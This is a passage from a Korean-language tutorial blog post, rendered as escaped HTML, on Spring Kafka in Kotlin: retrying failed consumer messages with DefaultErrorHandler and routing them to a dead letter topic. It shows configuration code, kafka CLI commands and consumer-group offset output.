&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.web.bind.annotation.ResponseStatus&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.web.bind.annotation.RestController&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.io.IOException&lt;/span&gt;  
            
&lt;span class=&quot;nd&quot;&gt;@RestController&lt;/span&gt;  
&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;UserController&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
    &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;userProducer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;UserProducer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
            
    &lt;span class=&quot;nd&quot;&gt;@Operation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;summary&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;user 메세지 생성 및 처리&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;description&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;user 메세지 생성 및 처리&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;tags&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;user&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;  
    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
    &lt;span class=&quot;nd&quot;&gt;@ResponseStatus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HttpStatus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
    &lt;span class=&quot;nd&quot;&gt;@Throws&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
    &lt;span class=&quot;nd&quot;&gt;@GetMapping&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/user&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;produces&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;MediaType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;APPLICATION_JSON_VALUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;  
    &lt;span class=&quot;k&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ResponseEntity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
            
        &lt;span class=&quot;n&quot;&gt;userProducer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hello world message&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
            
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ResponseEntity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ok&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
            &lt;span class=&quot;s&quot;&gt;&quot;success&quot;&lt;/span&gt;  
        &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
            
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;카프카 메세지 생성 및 소비 명령
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;curl http://localhost:8080/user  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;의문1---실패-시는-어떻게-되는가&quot;&gt;의문1 - 실패 시는 어떻게 되는가?&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;acknowledgment.acknowledge() 실행 전에 실패하면&lt;br /&gt;
오프셋이 갱신되지 않으면서 &lt;br /&gt;
컨슈머 다음 폴링 시에도 같은 데이터를 가져온다.&lt;/li&gt;
  &lt;li&gt;에러 핸들링을 설정하지 않는다면&lt;br /&gt;
acknowledgment.acknowledge() 이 실행되기 전까지&lt;br /&gt;
이 과정이 반복된다.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;에러-핸들러-추가&quot;&gt;에러 핸들러 추가&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;설명
    &lt;ul&gt;
      &lt;li&gt;1초 간격으로 3회 재시도 후 실패하면 다음 offset으로 넘어가게 한다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;KafkaConfig
    &lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nd&quot;&gt;@Configuration&lt;/span&gt;  
&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;KafkaConfig&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
                
    &lt;span class=&quot;c1&quot;&gt;// |-- 추가 시작 --|  &lt;/span&gt;
    &lt;span class=&quot;nd&quot;&gt;@Bean&lt;/span&gt;  
    &lt;span class=&quot;k&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;errorHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DefaultErrorHandler&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
        &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;backOff&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FixedBackOff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 1초 간격, 3회 재시도  &lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DefaultErrorHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;backOff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
    &lt;span class=&quot;c1&quot;&gt;// |-- 추가 끝 --|  &lt;/span&gt;
            
    &lt;span class=&quot;nd&quot;&gt;@Bean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;kafkaListenerContainerFactory&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;  
    &lt;span class=&quot;k&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;kafkaListenerContainerFactory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;consumerFactory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ConsumerFactory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;,&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;errorHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DefaultErrorHandler&lt;/span&gt;  
    &lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ConcurrentKafkaListenerContainerFactory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
        &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;factory&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ConcurrentKafkaListenerContainerFactory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;()&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;factory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;consumerFactory&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;consumerFactory&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;factory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;containerProperties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ackMode&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ContainerProperties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;AckMode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;MANUAL&lt;/span&gt;  
            
        &lt;span class=&quot;c1&quot;&gt;// |-- 추가 시작 --|  &lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;factory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;setCommonErrorHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errorHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
        &lt;span class=&quot;c1&quot;&gt;// |-- 추가 끝 --|  &lt;/span&gt;
            
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;factory&lt;/span&gt;  
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;결과
    &lt;ul&gt;
      &lt;li&gt;컨슈머에서 acknowledgment.acknowledge() 실행 전에 에러 발생시키고&lt;br /&gt;
메세지를 생성해보면 3회 재시도 후 무시되는 것을 확인할 수 있다.&lt;/li&gt;
      &lt;li&gt;컨슈머 그룹 상태 조회
        &lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;GROUP           TOPIC           PARTITION  CURRENT-OFFSET  LOG-END-OFFSET  LAG             CONSUMER-ID                                           HOST            CLIENT-ID  
user            user            2          26              26              0               consumer-user-9-09053eeb-9472-40fc-b866-752da9ffa02e  /172.18.0.1     consumer-user-9  
user            user            1          80              80              0               consumer-user-8-e8a1989e-c7ae-487d-95af-1eddb6ead117  /172.18.0.1     consumer-user-8  
user            user            0          34              34              0               consumer-user-10-c633f4c2-7af0-4fe9-ac2a-611f9ded2980 /172.18.0.1     consumer-user-10  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;실험 대상 파티션은 1번으로 CURRENT-OFFSET과 LOG-END-OFFSET이 &lt;br /&gt;
동일해진 것을 확인할 수 있다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;dead-letter-topicdlt로-보내기&quot;&gt;Dead Letter Topic(DLT)로 보내기&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;설명
    &lt;ul&gt;
      &lt;li&gt;DLT는 소비자가 처리하지 못한 메세지를 따로 모아두는 용도의 토픽이다.&lt;/li&gt;
      &lt;li&gt;컨슈머 메세지가 계속 실패하거나, 예외가 발생해도 처리할 수 없는 상황일때&lt;br /&gt;
해당 메세지를 DLT로 옮겨서 별도로 처리할 수 있도록 할 수 있다.&lt;/li&gt;
      &lt;li&gt;예시에서는 1초 마다 3회 재시도 후 실패하면 user.DLT로 보낸다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;user.DLT 토픽 생성
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;kafka-topics.sh &lt;span class=&quot;nt&quot;&gt;--create&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; 
 &lt;span class=&quot;nt&quot;&gt;--topic&lt;/span&gt; user.DLT &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; 
 &lt;span class=&quot;nt&quot;&gt;--bootstrap-server&lt;/span&gt; kafka:9092 &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; 
 &lt;span class=&quot;nt&quot;&gt;--partitions&lt;/span&gt; 3 &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; 
 &lt;span class=&quot;nt&quot;&gt;--replication-factor&lt;/span&gt; 1  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;KafkaConfig
    &lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nd&quot;&gt;@Configuration&lt;/span&gt;  
&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;KafkaConfig&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
            
    &lt;span class=&quot;nd&quot;&gt;@Bean&lt;/span&gt;  
    &lt;span class=&quot;k&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;errorHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kafkaTemplate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;KafkaTemplate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;):&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DefaultErrorHandler&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
        &lt;span class=&quot;c1&quot;&gt;// |-- 추가 시작 --|  &lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// DLT로 메시지를 보낼 Recoverer 설정  &lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;recoverer&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DeadLetterPublishingRecoverer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kafkaTemplate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;record&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-&amp;gt;&lt;/span&gt;  
            &lt;span class=&quot;c1&quot;&gt;// 기본 DLT 토픽 이름: 원래 토픽 이름 + &quot;.DLT&quot;  &lt;/span&gt;
            &lt;span class=&quot;nc&quot;&gt;TopicPartition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;${record.topic()}.DLT&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;record&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;partition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;  
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
        &lt;span class=&quot;c1&quot;&gt;// |-- 추가 끝 --|  &lt;/span&gt;
            
        &lt;span class=&quot;c1&quot;&gt;// 재시도: 1초 간격, 최대 3회  &lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;backOff&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FixedBackOff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
            
        &lt;span class=&quot;c1&quot;&gt;// |-- 추가 시작 --|  &lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;errorHandler&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DefaultErrorHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recoverer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;backOff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
        &lt;span class=&quot;c1&quot;&gt;// |-- 추가 끝 --|  &lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorHandler&lt;/span&gt;  
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
            
    &lt;span class=&quot;nd&quot;&gt;@Bean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;kafkaListenerContainerFactory&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;  
    &lt;span class=&quot;k&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;kafkaListenerContainerFactory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;consumerFactory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ConsumerFactory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;,&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;errorHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DefaultErrorHandler&lt;/span&gt;  
    &lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ConcurrentKafkaListenerContainerFactory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
        &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;factory&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ConcurrentKafkaListenerContainerFactory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;()&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;factory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;consumerFactory&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;consumerFactory&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;factory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;containerProperties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ackMode&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ContainerProperties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;AckMode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;MANUAL&lt;/span&gt;  
            
        &lt;span class=&quot;n&quot;&gt;factory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;setCommonErrorHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errorHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
            
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;factory&lt;/span&gt;  
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;user.DLT 토픽 cli로 구독
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
